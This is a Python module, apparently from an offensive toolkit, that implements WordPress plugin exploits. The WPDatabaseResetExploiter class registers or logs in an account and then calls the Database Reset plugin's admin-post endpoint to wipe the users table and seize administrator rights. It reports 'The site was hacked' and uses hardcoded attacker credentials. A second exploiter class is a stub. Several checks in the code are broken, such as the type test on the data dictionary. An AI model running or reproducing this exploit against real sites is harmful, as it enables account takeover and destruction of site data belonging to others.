"""
This Package is responsible to exploit vulnerability at Wordpress (system, plugins, theme, e.t.c)
The global parameters are available to modify at config.py - under the "exploiter_data".
:requirements: python3.X, asyncio, datetime, requests, urllib3, imaplib, time
"""

try:
    from config import exploiter_data, logs
    from wordpress import WPRegisterUser
    from http_handler import HTTPWithSession
except Exception as e:
    if 'logs' in dir():
        logs.save_log("Import Error: {}".format(e))
    print("Import Error: {}".format(e))


class WPExploit(object):
    """
    This is the most abstract class at the family of the Wordpress Exploiter - use for inhere uses only.
    Contain the most abstract method:
    :method plugin_name: don't have implementation and raise NotImplementError
    :method vulnerable_versions: don't have implementation and raise NotImplementError
    :method is_vulnerable_version: don't have implementation and raise NotImplementError
    :method get_references: have default implementation.
    :method is_vulnerable: don't have implementation and raise NotImplementError
    :method exploit: don't have implementation and raise NotImplementError
    """
    def __init__(self, domain, additional_data=None, proxies=None):
        """
        Keep state of data that is collected and tries that were performed for efficiency
        :param additional_data: data that might be useful for performing the bruteforce (e.g., login page URL)
        :param proxies: working via HTTP proxies
        """
        self._url = str(domain)
        self._additional_data = additional_data
        self._proxies = proxies
        self._logs = logs
        self._references = list()

    def plugin_name(self):
        """
        This method will return the plugin, theme, module name that is vulnerable.
        :return: str
        """

    def vulnerable_versions(self):
        """
        This method will return the plugin, theme, module version that is vulnerable.
        :return: str
        """
        raise NotImplementedError()

    def is_vulnerable_version(self, version_str):
        """
        This method will check if the given version is vulnerable version or not (if possible)
        :param version_str: str with the version
        :return: boolean
        """
        raise NotImplementedError()

    def get_references(self):
        """
        This method will return the list of URLs references to more information about the vulnerability.
        :return: list
        """
        return self._references

    def is_vulnerable(self, data=None, proxies=None):
        """
        Test whether vulnerable or not. If many requests or suspicious requests might be sent, consider adding
        aggresive parameter
        :param data: dictionary with data that can be used for the method
        :param proxies: working via HTTP proxies. If None, the constructor's proxies are used (if any)
        :return: Boolean - whether domain is vulnerable or not
        """
        raise NotImplementedError()

    def exploit(self, data=None, proxies=None):
        """
        If possible to exploit (E.g., in server-side vulns) - exploit
        In client-side, return the exploit code to use
        :param data: dictionary with data that can be used for the method
        :param proxies: working via HTTP proxies. If None, the constructor's proxies are used (if any)
        :return: Boolean - success or not
        """
        raise NotImplementedError()


class WPPluginExploiter(WPExploit):
    """
    This is an abstract class at the family of the Wordpress Exploiter - using for Plugins exploiting.
    Contain the most abstract method:
    :method plugin_name: don't have implementation and raise NotImplementError
    :method vulnerable_versions: have an default implementation.
    :method is_vulnerable_version: have an default implementation.
    :method is_vulnerable: have an default implementation.
    :method exploit: don't have implementation and raise NotImplementError
    """
    _README_PATH = exploiter_data['WPPluginExploiter'].get('readme_path', "")

    def __init__(self, domain, additional_data=None, proxies=None):
        super().__init__(domain, additional_data, proxies)
        self._plugin_name = None
        self._plugin_version_start = "Unknown"  # override with the start vulnerable versions
        self._plugin_version_end = "Unknown"  # override with the end vulnerable versions
        self._plugin_version_start_op = " <= "
        self._plugin_version_end_op = " <= "
        self._http = HTTPWithSession()

    def plugin_name(self):
        return self._plugin_name

    def vulnerable_versions(self):
        try:
            if self._plugin_version_start is "Unknown":
                return "Unknown"
            elif self._plugin_version_end is "Unknown":
                return "Unknown"
            version = str(self._plugin_version_start) + str(self._plugin_version_start_op)
            version += "Plugin Version"
            version += str(self._plugin_version_end_op) + str(self._plugin_version_end)
            return version
        except Exception as e:
            print("Something goes wrong, please check the logs file.", e)
            self._logs.save_log(e, "Error: vulnerable_versions function has crashed, please try again later.")
            return "Unknown"

    def is_vulnerable_version(self, version_str):
        try:
            start_version = str(self._plugin_version_start).replace(".", "").replace(" ", "").strip()
            end_version = str(self._plugin_version_end).replace(".", "").replace(" ", "").strip()
            test_version = str(version_str).replace(".", "").replace(" ", "").strip()
            max_digits = len(start_version)
            if len(end_version) > max_digits:
                max_digits = len(end_version)
            if len(test_version) > max_digits:
                max_digits = len(test_version)
            start_version = self._build_version(start_version, max_digits)
            end_version = self._build_version(end_version, max_digits)
            test_version = self._build_version(test_version, max_digits)
            if self._plugin_version_start_op is " < " and self._plugin_version_end_op is " < ":
                return start_version < test_version < end_version
            elif self._plugin_version_start_op is " <= " and self._plugin_version_start_op is " < ":
                return start_version <= test_version < end_version
            elif self._plugin_version_start_op is " < " and self._plugin_version_end_op is " <= ":
                return start_version < test_version <= end_version
            return start_version <= test_version <= end_version
        except Exception as e:
            print("Error: could not parse version.")
            print(e)
            return None

    def is_vulnerable(self, data=None, proxies=None):
        is_vulnerable = False
        try:
            is_vulnerable = self._readme_file(proxies)
        except Exception as e:
            print("Something goes wrong, please check the logs file.", e)
            self._logs.save_log(e, "Error: find version of plugin with readme file failed.")
        finally:
            return is_vulnerable

    def _readme_file(self, readme_path=None, proxies=None):
        """
        All the plugins has in their readme file their version, this method will check in the readme file
        the plugin version (if possible).
        :param readme_path: the path to the readme file of the plugin.
        :param proxies: proxies to use (recommended)
        :return: boolean
        """
        if readme_path is None:
            readme_path = self._README_PATH
        url = self._url + str(readme_path)
        response = self._http.request(url=url, method="GET", proxies=proxies)
        if response is None:
            return False
        if "Stable tag:" not in response.text:
            return False
        version = response.text.split("Stable tag:")[1].split("\n")[0]  # get the version of the plugin
        return self.is_vulnerable_version(version)

    def exploit(self, data=None, proxies=None):
        raise NotImplementedError()

    def _build_version(self, version, num_of_digits):
        """
        This is protected method design to build version from Wordpress version format.
        :param version: the version str
        :param num_of_digits: num of the required digits.
        :return: str
        """
        version = str(version)
        version += ("0" * (num_of_digits - len(version)))
        version = int(version)
        return version


class WPDatabaseResetExploiter(WPPluginExploiter):
    """
    This class is one of the Wordpress Exploiter family - design to exploit specific plugin vulnerability.
    """
    _USERNAME = exploiter_data['WPDatabaseResetExploiter'].get('username', 'elroattacker')
    _PASS = exploiter_data['WPDatabaseResetExploiter'].get('pass', '123456')
    _EMAIL = exploiter_data['WPDatabaseResetExploiter'].get('email', 'elro@elro-sec.com')
    _EMAIL_SERVER = exploiter_data['WPDatabaseResetExploiter'].get('email_server', 'elro-sec.com')
    _EMAIL_PASS = exploiter_data['WPDatabaseResetExploiter'].get('email_pass', 'elroWordpress')
    _README_PATH = exploiter_data['WPDatabaseResetExploiter']. \
        get('email_pass', '/wp-content/plugins/wordpress-database-reset/readme.txt')
    _REQUIRED_DATA = exploiter_data['WPDatabaseResetExploiter'].get('required_data', [])
    _LOGIN_REQUIRED_DATA = exploiter_data['WPDatabaseResetExploiter'].get('login_required_data', [])
    _REGISTER_REQUIRED_DATA = exploiter_data['WPDatabaseResetExploiter'].get('register_required_data', [])

    def __init__(self, domain, proxies=None):
        super().__init__(domain=domain, proxies=proxies)
        self._plugin_name = ""
        self._plugin_version_start = 0
        self._plugin_version_end = "3.15"
        self._plugin_version_start_op = " <= "
        self._plugin_version_end_op = " < "
        self._references = [
            'https://www.wordfence.com/blog/2020/01/easily-exploitable-vulnerabilities-patched-in-wp-database-reset-plugin',
            'https://blog.qualys.com/webappsec/2020/01/24/wordpress-database-reset-plugin-vulnerability-cve-2020-7047-cve-2020-7048',
            'https://wpvulndb.com/vulnerabilities/10027']

    def exploit(self, data=None, proxies=None):
        """
        :param data: dictionary with data username & password for login, if dictionary is None,
                     the exploit will try to register, with default data.
                     username: will hold the username (for login or register new user)
                     password: will hole the password of the username (for login or register new user)
                     register_page: will hold the url for the register page (for register only)
                     login_page: will hold the url for the login page (for login or register new user)
                     action: "register" for register new user or "login" for login with existing one.
                     cannot send only the username & password => must send all the parameters or None!
        :param proxies: proxies
        :return: boolean
        """
        try:
            print("1) Start exploit .... check if possible.")
            self._http.clean_session()
            if not self.is_vulnerable():
                print("\tAttack are not possible on this web-site.")
                return False
            if data is None:
                data = {"username": self._USERNAME, "password": self._PASS,
                        "login_page": "{}/wp-login.php".format(self._url),
                        "register_page": "{}/wp-login.php?action=register".format(self._url),
                        "action": "register"}
            print("\tThe attack seems possible")
            print("2) Checking given data...")
            if data is not dict:
                print("Error: the given param 'data' is not a dict, is {}.".format(type(data)))
                return False
            data['mail_server'] = self._EMAIL_SERVER
            data['mail_user'] = self._EMAIL
            data['mail_pass'] = self._EMAIL_PASS
            for required in self._REQUIRED_DATA:
                if required not in data:
                    print("\tFailed to verify data, missing {} at the 'data' dict.".format(required))
                    return False
            print("\tData is OK!")
            if data['action'] == "register":
                print("3) Register new user ...")
                is_registered = self._register(proxies=proxies, data=data)
                if not is_registered:
                    print("\tRegistration Failed, please check the log file.")
                    return False
                print("\tRegistration success...")
            else:
                print("3) Registration is not necessary => skip")
            print("4) Try to log-in")
            is_logged_in = self._login(data=data, proxies=proxies)
            if not is_logged_in:
                print("\tLog-in failed please check the log file.")
                return False
            target = "{}/wp-admin/admin-post.php?" \
                                 "db-reset-tables%5B%5D=users&db-reset-code=11111&db-reset-code-confirm=11111".format(self._url)
            print("\tLogin success")
            print("5) Execute the attack ..")
            payload_response = self._http.request(url=target, method="GET")
            if payload_response is None:
                print("\nthe attack is not possible on this web-site")
                return False
            print("\tThe site was hacked, you can login now at: {}".format(data['login_page']))
            print("\tUsername: {}".format(data['username']))
            print("\tPassword: {}".format(data['password']))
            print("\tRole: You have full permissions, you are an administrator")
            return True
        except Exception as e:
            print("Something goes wrong, please check the logs file.", e)
            self._logs.save_log(e, "Error: failed to attack the web-site.")

    def _register(self, data, proxies=None):
        """
        This is a private method design to register new user at the target Wordpress system.
        :param data: the user data (dict)
        :param proxies: proxies to use
        :return: boolean indicate on success.
        """
        for required in self._REGISTER_REQUIRED_DATA:
            if required not in data:
                self._logs.save_log("Error: missing {} for register new user at the 'data' param.".format(required))
                return False
        register = WPRegisterUser()
        return register.register(data, proxies)

    def _login(self, data, proxies=None):
        """
        This is a private method design to login into user account at the target Wordpress system.
        :param data: the user data (dict)
        :param proxies: proxies to use
        :return: boolean indicate on success.
        """
        try:
            for required in self._LOGIN_REQUIRED_DATA:
                if required not in data:
                    self._logs.save_log("Error: missing {} for login to user at the 'data' param.".format(required))
                    return False
            username = data['username']
            password = data['password']
            login_page = data['login_page']
            self._http.clean_session()
            parameters = {'log': username, 'pwd': password, 'wp-submit': 'Login',
                          'testcookie': '1'}
            response = self._http.request(url=login_page, method="POST", params=parameters, proxies=proxies)
            if response is None or "wordpress_logged_in" not in str(response.cookies):
                return False
            return True
        except Exception as e:
            self._logs.save_log(e, "Error: could not login to the web-site.")
            return False


class TimeCapsuleExploiter(WPPluginExploiter):
    """
    This class is one of the Wordpress Exploiter family - design to exploit specific plugin vulnerability.
    """
    def __init__(self, domain, proxies=None):
        super().__init__(domain=domain, proxies=proxies)
        self._plugin_name = "Backup and Staging by WP Time Capsule"
        self._plugin_version_start = 0
        self._plugin_version_end = "1.21.16"
        self._plugin_version_start_op = " <= "
        self._plugin_version_end_op = " < "
        self._references = ['https://wpvulndb.com/vulnerabilities/10010']

    def exploit(self, data=None, proxies=None, shell=False):
        """
        :param data: dictionary with data username & password for login, if dictionary is None,
                     the exploit will try to register, with default data.
                     username: will hold the username (for login or register new user)
                     password: will hole the password of the username (for login or register new user)
                     register_page: will hold the url for the register page (for register only)
                     login_page: will hold the url for the login page (for login or register new user)
                     action: "register" for register new user or "login" for login with existing one.
                     cannot send only the username & password => must send all the parameters or None!
        :param proxies: proxies
        :return: boolean
        """
        try:
            print("Todo..")
        except Exception as e:
            print("Something goes wrong, please check the logs file.", e)
            self._logs.save_log(e, "Error: failed to attack the web-site.")